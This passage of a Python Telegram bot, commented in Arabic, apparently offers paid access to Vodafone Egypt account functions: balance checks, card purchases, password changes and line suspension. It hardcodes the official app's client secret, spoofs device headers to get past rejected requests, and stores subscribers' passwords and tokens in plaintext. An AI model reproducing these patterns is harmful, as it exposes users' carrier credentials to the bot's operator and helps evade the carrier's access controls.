            for item in data:
                if item.get('name') == 'Balance':
                    return item.get('characteristics', [{}])[0].get('value', '0.0')
        elif response.status_code == 403:
            logger.warning("Request Rejected، جرب headers مختلف")
            headers['x-agent-operatingsystem'] = 'Android 13'
            headers['x-agent-device'] = 'Samsung SM-G998B'
            response = requests.get(url, params=params, headers=headers, timeout=30)
            if response.status_code == 200:
                data = response.json()
                for item in data:
                    if item.get('name') == 'Balance':
                        return item.get('characteristics', [{}])[0].get('value', '0.0')
        
        return "0.0"
        
    except Exception as e:
        logger.error(f"خطأ في جلب الرصيد: {e}")
        return "0.0"

def adapt_datetime(val):
    return val.isoformat()

def convert_datetime(val):
    try:
        return datetime.fromisoformat(val.decode())
    except:
        return datetime.fromisoformat(val)

sqlite3.register_adapter(datetime, adapt_datetime)
sqlite3.register_converter("TIMESTAMP", convert_datetime)

# ===== تحديث هيكل قاعدة البيانات لدعم أرقام متعددة لكل مستخدم =====
def init_database():
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    # جدول المستخدمين (يدعم عدة أرقام لنفس المستخدم)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER,
            number TEXT,
            password TEXT,
            token TEXT,
            login_time TIMESTAMP,
            is_logged_in INTEGER DEFAULT 0,
            token_expiry TIMESTAMP,
            last_refresh TIMESTAMP,
            line_balance TEXT DEFAULT '0.0',
            PRIMARY KEY (user_id, number)
        )
    ''')
    
    # جدول الاشتراكات
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS subscriptions (
            user_id INTEGER PRIMARY KEY,
            subscription_start TIMESTAMP,
            subscription_end TIMESTAMP,
            is_active INTEGER DEFAULT 0,
            days_remaining INTEGER DEFAULT 0,
            last_check TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # جدول حالات المستخدمين
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_states (
            user_id INTEGER PRIMARY KEY,
            step TEXT,
            action TEXT,
            data TEXT,
            created_at TIMESTAMP
        )
    ''')
    
    # جدول سجل الاشتراكات
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS subscription_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            admin_id INTEGER,
            action TEXT,
            days_added INTEGER,
            days_removed INTEGER,
            old_end_date TIMESTAMP,
            new_end_date TIMESTAMP,
            action_time TIMESTAMP,
            note TEXT
        )
    ''')
    
    # جدول إعدادات البوت
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bot_settings (
            setting_key TEXT PRIMARY KEY,
            setting_value TEXT,
            updated_by INTEGER,
            updated_at TIMESTAMP
        )
    ''')
    
    # جدول رؤية الأزرار (إظهار/إخفاء لكل زر)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS button_visibility (
            button_key TEXT PRIMARY KEY,
            visible_to_all INTEGER DEFAULT 1
        )
    ''')
    
    # جدول سجل تحويل الرصيد
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS balance_transfer_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            sender_number TEXT,
            receiver_number TEXT,
            amount REAL,
            fees REAL,
            status TEXT,
            timestamp TIMESTAMP
        )
    ''')
    
    # جدول إحصائيات الأزرار
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS button_stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            button_key TEXT,
            timestamp TIMESTAMP
        )
    ''')
    
    # جدول المستخدمين المحظورين
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS banned_users (
            user_id INTEGER PRIMARY KEY
        )
    ''')
    
    # جدول المساعدين
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS assistant_admins (
            user_id INTEGER PRIMARY KEY
        )
    ''')
    
    # إضافة إعداد الاشتراك الإجباري إذا لم يكن موجوداً
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "require_subscription"')
    result = cursor.fetchone()
    if not result:
        cursor.execute('''
            INSERT INTO bot_settings (setting_key, setting_value, updated_at)
            VALUES (?, ?, ?)
        ''', ('require_subscription', str(REQUIRE_SUBSCRIPTION), datetime.now(egypt_tz)))
    
    # إضافة إعداد رقم فودافون كاش إذا لم يكن موجوداً
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "vodafone_cash_number"')
    result = cursor.fetchone()
    if not result:
        cursor.execute('''
            INSERT INTO bot_settings (setting_key, setting_value, updated_at)
            VALUES (?, ?, ?)
        ''', ('vodafone_cash_number', '01091874118', datetime.now(egypt_tz)))
    
    # إضافة إعداد رابط بوت تطير إذا لم يكن موجوداً
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "family_bot_link"')
    result = cursor.fetchone()
    if not result:
        cursor.execute('''
            INSERT INTO bot_settings (setting_key, setting_value, updated_at)
            VALUES (?, ?, ?)
        ''', ('family_bot_link', 'https://t.me/cobra_familybot', datetime.now(egypt_tz)))
    
    # إضافة إعداد يوزر المطور إذا لم يكن موجوداً
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "developer_username"')
    result = cursor.fetchone()
    if not result:
        cursor.execute('''
            INSERT INTO bot_settings (setting_key, setting_value, updated_at)
            VALUES (?, ?, ?)
        ''', ('developer_username', 'cobra_x_channel', datetime.now(egypt_tz)))
    
    # تهيئة رؤية الأزرار لجميع المفاتيح الموجودة
    for key in BUTTON_NAMES.keys():
        cursor.execute('INSERT OR IGNORE INTO button_visibility (button_key, visible_to_all) VALUES (?, 1)', (key,))
    
    conn.commit()
    conn.close()
    logger.info("✅ تم تهيئة قاعدة البيانات بنجاح مع جميع الجداول")

def get_require_subscription_setting():
    """الحصول على إعداد الاشتراك الإجباري من قاعدة البيانات"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "require_subscription"')
    result = cursor.fetchone()
    conn.close()
    
    if result:
        return result[0].lower() == 'true'
    return REQUIRE_SUBSCRIPTION

def set_require_subscription_setting(value, admin_id):
    """تحديث إعداد الاشتراك الإجباري"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    now = datetime.now(egypt_tz)
    cursor.execute('''
        UPDATE bot_settings SET setting_value = ?, updated_by = ?, updated_at = ?
        WHERE setting_key = "require_subscription"
    ''', (str(value), admin_id, now))
    
    conn.commit()
    conn.close()
    
    global REQUIRE_SUBSCRIPTION
    REQUIRE_SUBSCRIPTION = value
    return True

def get_vodafone_cash_number():
    """الحصول على رقم فودافون كاش من قاعدة البيانات"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "vodafone_cash_number"')
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else "01014725311"

def set_vodafone_cash_number(value, admin_id):
    """تحديث رقم فودافون كاش"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    now = datetime.now(egypt_tz)
    cursor.execute('''
        UPDATE bot_settings SET setting_value = ?, updated_by = ?, updated_at = ?
        WHERE setting_key = "vodafone_cash_number"
    ''', (value, admin_id, now))
    conn.commit()
    conn.close()
    return True

def get_family_bot_link():
    """الحصول على رابط بوت تطير من قاعدة البيانات"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT setting_value FROM bot_settings WHERE setting_key = "family_bot_link"')
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else "https://t.me/cobra_familybot"

def set_family_bot_link(value, admin_id):
    """تحديث رابط بوت تطير"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    now = datetime.now(egypt_tz)
    cursor.execute('''
        UPDATE bot_settings SET setting_value = ?, updated_by = ?, updated_at = ?
        WHERE setting_key = "family_bot_link"
    ''', (value, admin_id, now))
    conn.commit()
    conn.close()
    return True

def get_button_visibility(button_key):
    """الحصول على حالة رؤية زر معين (1 للجميع، 0 للأدمن فقط)"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT visible_to_all FROM button_visibility WHERE button_key = ?', (button_key,))
    result = cursor.fetchone()
    conn.close()
    if result:
        return result[0] == 1
    return True  # افتراضي: مرئي للجميع

def set_button_visibility(button_key, visible_to_all):
    """تحديث حالة رؤية زر معين"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('UPDATE button_visibility SET visible_to_all = ? WHERE button_key = ?', 
                   (1 if visible_to_all else 0, button_key))
    conn.commit()
    conn.close()
    return True

def get_all_users_ids():
    """جلب جميع معرفات المستخدمين الذين تفاعلوا مع البوت (من جدول users)"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT DISTINCT user_id FROM users')
    users = cursor.fetchall()
    conn.close()
    return [user[0] for user in users]

def check_subscription_db(user_id):
    """التحقق من صلاحية الاشتراك في قاعدة البيانات"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    now = datetime.now(egypt_tz)
    
    cursor.execute('''
        SELECT subscription_end, is_active FROM subscriptions WHERE user_id = ?
    ''', (user_id,))
    result = cursor.fetchone()
    
    if result:
        end_date, is_active = result
        if isinstance(end_date, str):
            try:
                end_date = datetime.fromisoformat(end_date)
            except:
                end_date = None
        
        if end_date and end_date > now and is_active == 1:
            # حساب الأيام المتبقية
            days_remaining = (end_date - now).days
            cursor.execute('''
                UPDATE subscriptions SET days_remaining = ?, last_check = ? 
                WHERE user_id = ?
            ''', (days_remaining, now, user_id))
            conn.commit()
            conn.close()
            return True, days_remaining, end_date
    
    conn.close()
    return False, 0, None

def add_subscription(user_id, days, admin_id):
    """إضافة اشتراك لمستخدم"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    now = datetime.now(egypt_tz)
    new_end_date = now + timedelta(days=days)
    
    # التحقق من وجود اشتراك سابق
    cursor.execute('SELECT subscription_end FROM subscriptions WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result:
        old_end_date = result[0]
        if isinstance(old_end_date, str):
            try:
                old_end_date = datetime.fromisoformat(old_end_date)
            except:
                old_end_date = now
        
        # إذا كان الاشتراك الحالي لا يزال ساري، نضيف الأيام إلى نهايته
        if old_end_date > now:
            new_end_date = old_end_date + timedelta(days=days)
        
        cursor.execute('''
            UPDATE subscriptions SET 
                subscription_end = ?,
                is_active = 1,
                days_remaining = ?,
                last_check = ?
            WHERE user_id = ?
        ''', (new_end_date, days, now, user_id))
    else:
        cursor.execute('''
            INSERT INTO subscriptions (user_id, subscription_start, subscription_end, is_active, days_remaining, last_check)
            VALUES (?, ?, ?, 1, ?, ?)
        ''', (user_id, now, new_end_date, days, now))
    
    # تسجيل العملية
    cursor.execute('''
        INSERT INTO subscription_log (user_id, admin_id, action, days_added, new_end_date, action_time)
        VALUES (?, ?, 'add', ?, ?, ?)
    ''', (user_id, admin_id, days, new_end_date, now))
    
    conn.commit()
    conn.close()
    return new_end_date

def remove_subscription_days(user_id, days, admin_id):
    """حذف أيام من اشتراك مستخدم"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    now = datetime.now(egypt_tz)
    
    cursor.execute('SELECT subscription_end FROM subscriptions WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result:
        old_end_date = result[0]
        if isinstance(old_end_date, str):
            try:
                old_end_date = datetime.fromisoformat(old_end_date)
            except:
                old_end_date = now
        
        # حساب التاريخ الجديد بعد حذف الأيام
        new_end_date = old_end_date - timedelta(days=days)
        
        # التأكد من أن التاريخ الجديد ليس في الماضي
        if new_end_date < now:
            new_end_date = now
            is_active = 0
        else:
            is_active = 1
        
        days_remaining = (new_end_date - now).days if new_end_date > now else 0
        
        cursor.execute('''
            UPDATE subscriptions SET 
                subscription_end = ?,
                is_active = ?,
                days_remaining = ?,
                last_check = ?
            WHERE user_id = ?
        ''', (new_end_date, is_active, days_remaining, now, user_id))
        
        # تسجيل العملية
        cursor.execute('''
            INSERT INTO subscription_log (user_id, admin_id, action, days_removed, old_end_date, new_end_date, action_time)
            VALUES (?, ?, 'remove', ?, ?, ?, ?)
        ''', (user_id, admin_id, days, old_end_date, new_end_date, now))
        
        conn.commit()
        conn.close()
        return new_end_date, is_active
    
    conn.close()
    return None, False

def get_subscription_info(user_id):
    """الحصول على معلومات الاشتراك"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT subscription_start, subscription_end, is_active, days_remaining, last_check
        FROM subscriptions WHERE user_id = ?
    ''', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        start_date, end_date, is_active, days_remaining, last_check = result
        return {
            'start_date': start_date,
            'end_date': end_date,
            'is_active': is_active,
            'days_remaining': days_remaining,
            'last_check': last_check
        }
    return None

def save_user_session(user_id, number, password, token, balance="0.0"):
    """حفظ جلسة المستخدم مع دعم أرقام متعددة"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    now = datetime.now(egypt_tz)
    
    # أولاً: إلغاء تسجيل الدخول لأي رقم آخر لنفس المستخدم
    cursor.execute('UPDATE users SET is_logged_in = 0 WHERE user_id = ?', (user_id,))
    
    # ثم إدراج أو تحديث الرقم الجديد مع تعيين is_logged_in = 1
    cursor.execute('''
        INSERT OR REPLACE INTO users 
        (user_id, number, password, token, login_time, is_logged_in, token_expiry, last_refresh, line_balance) 
        VALUES (?, ?, ?, ?, ?, 1, ?, ?, ?)
    ''', (user_id, number, password, token, now, now + timedelta(hours=1), now, balance))
    
    conn.commit()
    conn.close()

def get_user_session(user_id):
    """استرجاع الجلسة النشطة للمستخدم (الرقم المسجل دخوله)"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT number, password, token, token_expiry, last_refresh, line_balance 
        FROM users WHERE user_id = ? AND is_logged_in = 1
    ''', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        number, password, token, expiry, last_refresh, balance = result[:6]
        
        if expiry:
            now = datetime.now(egypt_tz)
            if isinstance(expiry, str):
                try:
                    expiry = datetime.fromisoformat(expiry)
                except:
                    expiry = None
            
            if expiry and expiry < now:
                new_token = get_fresh_token(number, password)
                if new_token and not new_token.startswith("ERROR:"):
                    # تحديث الرصيد عند تجديد التوكن
                    new_balance = get_line_balance(new_token, number)
                    save_user_session(user_id, number, password, new_token, new_balance)
                    token = new_token
                    balance = new_balance
        
        return {
            'number': number,
            'password': password,
            'token': token,
            'balance': balance
        }
    return None

def attempt_auto_login(user_id, number):
    """محاولة تسجيل الدخول تلقائياً إذا كان الرقم مسجلاً للمستخدم خلال 24 ساعة"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT password, login_time FROM users WHERE user_id = ? AND number = ?
    ''', (user_id, number))
    row = cursor.fetchone()
    conn.close()
    if row:
        password, login_time = row
        # التحقق من أن login_time ضمن 24 ساعة
        if isinstance(login_time, str):
            try:
                login_time = datetime.fromisoformat(login_time)
            except:
                login_time = None
        if login_time:
            now = datetime.now(egypt_tz)
            if now - login_time < timedelta(hours=24):
                # محاولة الحصول على توكن جديد باستخدام كلمة المرور المحفوظة
                token = get_fresh_token(number, password)
                if not token.startswith("ERROR:"):
                    # تحديث الجلسة
                    save_user_session(user_id, number, password, token)
                    return True
    return False

def update_user_balance(user_id, balance):
    """تحديث رصيد الخط في قاعدة البيانات"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    
    try:
        cursor.execute('UPDATE users SET line_balance = ? WHERE user_id = ? AND is_logged_in = 1', (balance, user_id))
        conn.commit()
    except Exception as e:
        logger.error(f"خطأ في تحديث الرصيد: {e}")
    finally:
        conn.close()

def refresh_all_balances():
    """تحديث جميع أرصدة المستخدمين"""
    try:
        conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id, number, token FROM users WHERE is_logged_in = 1')
        users = cursor.fetchall()
        
        for user_id, number, token in users:
            try:
                balance = get_line_balance(token, number)
                cursor.execute('UPDATE users SET line_balance = ? WHERE user_id = ? AND is_logged_in = 1', (balance, user_id))
                logger.info(f"✅ تم تحديث رصيد المستخدم {user_id}: {balance}")
            except Exception as e:
                logger.error(f"❌ خطأ في تحديث رصيد المستخدم {user_id}: {e}")
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        logger.error(f"❌ خطأ في تحديث الأرصدة: {e}")

def logout_user(user_id):
    """تسجيل خروج المستخدم (إلغاء is_logged_in لجميع أرقامه)"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_logged_in = 0 WHERE user_id = ?', (user_id,))
    cursor.execute('DELETE FROM user_states WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def serialize_data(data):
    if data is None:
        return '{}'
    
    try:
        return json.dumps(data, ensure_ascii=False)
    except:
        return '{}'

def save_user_state(user_id, step=None, action=None, data=None):
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    data_str = serialize_data(data)
    cursor.execute('''
        INSERT OR REPLACE INTO user_states 
        (user_id, step, action, data, created_at) 
        VALUES (?, ?, ?, ?, ?)
    ''', (user_id, step, action, data_str, datetime.now(egypt_tz)))
    conn.commit()
    conn.close()

def get_user_state(user_id):
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT step, action, data FROM user_states WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        try:
            data = json.loads(result[2]) if result[2] else {}
        except:
            data = {}
        return {
            'step': result[0],
            'action': result[1],
            'data': data
        }
    return None

def clear_user_state(user_id):
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM user_states WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def auto_refresh_tokens():
    while True:
        try:
            time.sleep(3600)
            
            conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
            cursor = conn.cursor()
            cursor.execute('SELECT user_id, number, password FROM users WHERE is_logged_in = 1')
            users = cursor.fetchall()
            
            for user_id, number, password in users:
                try:
                    token = get_fresh_token(number, password)
                    if token and not token.startswith("ERROR:"):
                        # تحديث الرصيد مع التوكن
                        balance = get_line_balance(token, number)
                        cursor.execute('UPDATE users SET token = ?, line_balance = ? WHERE user_id = ? AND number = ?', 
                                     (token, balance, user_id, number))
                        logger.info(f"✅ تم تحديث توكن ورصيد المستخدم {user_id} للرقم {number}")
                except Exception as e:
                    logger.error(f"❌ خطأ في تحديث توكن المستخدم {user_id}: {e}")
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"❌ خطأ في تحديث التوكنات التلقائي: {e}")
            time.sleep(300)

def auto_clean_old_data():
    while True:
        try:
            time.sleep(86400)
            
            conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
            cursor = conn.cursor()
            
            cutoff_time = datetime.now(egypt_tz) - timedelta(days=7)
            cursor.execute('DELETE FROM users WHERE login_time < ? AND is_logged_in = 0', (cutoff_time,))
            
            state_cutoff = datetime.now(egypt_tz) - timedelta(hours=24)
            cursor.execute('DELETE FROM user_states WHERE created_at < ?', (state_cutoff,))
            
            deleted_users = cursor.rowcount
            conn.commit()
            conn.close()
            
            if deleted_users > 0:
                logger.info(f"🧹 تم تنظيف {deleted_users} مستخدم قديم")
                
        except Exception as e:
            logger.error(f"❌ خطأ في تنظيف البيانات التلقائي: {e}")
            time.sleep(3600)

def auto_refresh_balances():
    """تحديث الأرصدة كل 30 دقيقة"""
    while True:
        try:
            time.sleep(1800)  # 30 دقيقة
            refresh_all_balances()
            logger.info(f"✅ تم تحديث أرصدة جميع المستخدمين")
        except Exception as e:
            logger.error(f"❌ خطأ في تحديث الأرصدة التلقائي: {e}")
            time.sleep(300)

def start_background_tasks():
    try:
        token_thread = Thread(target=auto_refresh_tokens, daemon=True)
        token_thread.start()
        
        cleanup_thread = Thread(target=auto_clean_old_data, daemon=True)
        cleanup_thread.start()
        
        balance_thread = Thread(target=auto_refresh_balances, daemon=True)
        balance_thread.start()
        
        if RESTART_ENABLED:
            schedule_restart()
        
        logger.info("✅ تم بدء المهام الخلفية (تحديث التوكنات وتنظيف البيانات وتحديث الأرصدة وإعادة التشغيل)")
    except Exception as e:
        logger.error(f"❌ خطأ في بدء المهام الخلفية: {e}")

def cancel_all_next_steps(user_id):
    """إلغاء جميع الخطوات التالية للمستخدم"""
    clear_user_state(user_id)

# ===== دوال جديدة لخدمة كروت فكة (مأخوذة من ملف كروت فكة القديم مع تعديل) =====
def purchase_card_from_vodafone(number, password, card_id):
    """شراء كارت فكة باستخدام بيانات المستخدم"""
    try:
        token = get_fresh_token(number, password)
        if token.startswith("ERROR:"):
            return {"success": False, "message": token}
        
        url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
        
        payload = {
            "channel": {"name": "MobileApp"},
            "orderItem": [{
                "action": "insert",
                "product": {
                    "id": card_id,
                    "relatedParty": [{"id": number, "name": "MSISDN", "role": "Subscriber"}]
                },
                "eCode": 0
            }],
            "@type": "FakkaAndMared"  # كما في الكود القديم
        }
        
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'api-host': "ProductOrderingManagement",
            'useCase': "FakkaAndMaredProduct",
            'Authorization': f"Bearer {token}",
            'api-version': "v2",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "HONOR ALI-NX1",
            'x-agent-version': "2025.11.1.1",
            'x-agent-build': "1064",
            'msisdn': number,
            'Accept-Language': "ar"
        }
        
        response = requests.post(url, json=payload, headers=headers, timeout=30)
        
        if response.status_code in [200, 201]:
            return {"success": True, "message": f"✅ تم شراء الكارت {card_id} بنجاح!"}
        else:
            try:
                error = response.json()
                reason = error.get('reason', 'خطأ غير معروف')
                # التحقق من رسالة عدم كفاية الرصيد
                if "Insufficient balance" in reason:
                    reason = "لا يوجد رصيد كافي اشحن و حاول مجددا"
                return {"success": False, "message": f"❌ فشل الشراء: {reason}"}
            except:
                return {"success": False, "message": f"❌ فشل الشراء (كود {response.status_code})"}
                
    except Exception as e:
        return {"success": False, "message": f"❌ خطأ: {str(e)}"}

def create_cards_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    for i, card in enumerate(CARDS_LIST):
        display_name = card.replace('_', ' ')
        markup.add(types.InlineKeyboardButton(display_name, callback_data=f"buy_card_{i}"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="services_section"))
    return markup

# ===== دوال جديدة لخدمة شحن الكروت (بدلاً من القديمة) =====
# ملاحظة: تم تعطيل خدمة الشحن القديمة واستبدالها بخدمة كروت فكة أعلاه.

# ===== دوال جديدة لخدمة تحويل الرصيد =====
def add_balance_transfer_history(user_id, sender_number, receiver_number, amount, fees, status):
    """إضافة سجل تحويل رصيد جديد"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    now = datetime.now(egypt_tz)
    cursor.execute('''
        INSERT INTO balance_transfer_history (user_id, sender_number, receiver_number, amount, fees, status, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, sender_number, receiver_number, amount, fees, status, now))
    conn.commit()
    conn.close()

def get_balance_transfer_history(user_id, limit=10):
    """جلب آخر سجلات تحويل الرصيد للمستخدم"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT sender_number, receiver_number, amount, fees, status, timestamp FROM balance_transfer_history
        WHERE user_id = ? ORDER BY timestamp DESC LIMIT ?
    ''', (user_id, limit))
    rows = cursor.fetchall()
    conn.close()
    return rows

# ===== دوال تسجيل الدخول الموحدة (جديدة) - تم نقلها للأعلى =====
# تم تعريف login في البداية

# ===== دالة الحصول على توكن جديد باستخدام VodafoneAccount =====
def get_fresh_token(number, password):
    """
    دالة موحدة للحصول على توكن جديد باستخدام كلاس VodafoneAccount
    تحاول عدة عملاء إذا فشل العميل الافتراضي.
    """
    try:
        # المحاولة أولاً باستخدام العميل الافتراضي (ana-vodafone-app)
        voda = VodafoneAccount()
        if voda.login(number, password):
            return voda.get_access_token()
        
        # إذا فشلت، نجرب بقية العملاء من القائمة
        for client in CLIENT_CREDENTIALS:
            if client['client_id'] == "ana-vodafone-app":  # تخطيناها بالفعل
                continue
            voda = VodafoneAccount()
            if voda.login(number, password, client['client_id'], client['client_secret']):
                return voda.get_access_token()
        
        # إذا فشلت جميع المحاولات
        return "ERROR: فشل تسجيل الدخول بعد جميع المحاولات. تأكد من بيانات الدخول."
    
    except Exception as e:
        logger.error(f"❌ خطأ غير متوقع في get_fresh_token: {e}")
        return f"ERROR: خطأ غير متوقع: {str(e)}"

def get_authorization_new(number, password):
    """تسجيل الدخول باستخدام API الموبايل الجديد - ترجع 'Bearer توكن' أو 'error'"""
    token = get_fresh_token(number, password)
    if not token.startswith("ERROR:"):
        return "Bearer " + token
    return "error"

# ===== دوال تغيير كلمة المرور الجديدة (مأخوذة من ملف تغيير باسوورد.py) =====
def get_access_token_for_password_change(number, password):
    """الحصول على توكن الوصول من فودافون لتغيير كلمة المرور"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    payload = {
        'grant_type': "password",
        'username': number,
        'password': password,
        'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        'client_id': "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "true",
        'x-agent-operatingsystem': "11",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "OPPO oppo6779",
        'x-agent-version': "2025.12.1",
        'x-agent-build': "1075",
        'digitalId': "25ZNE6L15KO9B",
        'device-id': "70d3004b2bd92694"
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        response_data = response.json()
        
        if 'access_token' in response_data:
            return response_data['access_token']
        else:
            return None
    except:
        return None

def change_vodafone_password(number, password, new_password, token):
    """تغيير كلمة المرور باستخدام التوكن"""
    url = "https://mobile.vodafone.com.eg/services/dxl/sam/serviceAccountManagement/v1/serviceAccount"
    
    payload = {
        "customerAccount": {
            "authentication": {
                "newPassword": new_password,
                "password": password
            }
        },
        "resources": [
            {
                "IDs": [
                    {
                        "value": number
                    }
                ],
                "resourceType": "MSISDN"
            }
        ],
        "@type": "userPrefsUpdate"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "70d3004b2bd92694",
        'x-agent-operatingsystem': "11",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "OPPO oppo6779",
        'x-agent-version': "2025.12.1",
        'x-agent-build': "1075",
        'msisdn': number,
        'Accept-Language': "ar",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    try:
        response = requests.patch(url, data=json.dumps(payload), headers=headers, timeout=30)
        return response.status_code == 200
    except:
        return False

def login_for_discount(phone_number: str, password: str) -> Optional[Dict[str, str]]:
    """تسجيل الدخول للحصول على رمز الوصول لعروض الخصم"""
    success, token, _, _ = login(phone_number, password)
    if success:
        return {
            'access_token': token,
            'phone_number': phone_number
        }
    return None

# تعديل كلاس VodafoneManager
class VodafoneManager:
    def __init__(self, num: str, passw: str, national: Optional[str] = None):
        self.base_url = "https://mobile.vodafone.com.eg"
        retry_strategy = Retry(
            total=3,                
            status_forcelist=[429, 500, 502, 503, 504],
            backoff_factor=1,      
            allowed_methods=["HEAD", "GET", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session = requests.Session()
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)
        self.num = num
        self.passw = passw
        self.national = national
        self.token = None
        
    def get_access_token(self) -> bool:
        success, token, _, _ = login(self.num, self.passw)
        if success:
            self.token = token
            return True
        return False
    
    def suspend_line(self) -> Dict[str, Any]:
        if not self.token:
            return {"success": False, "message": "خطأ: لم يتم تسجيل الدخول أو فقد رمز الوصول."}
        
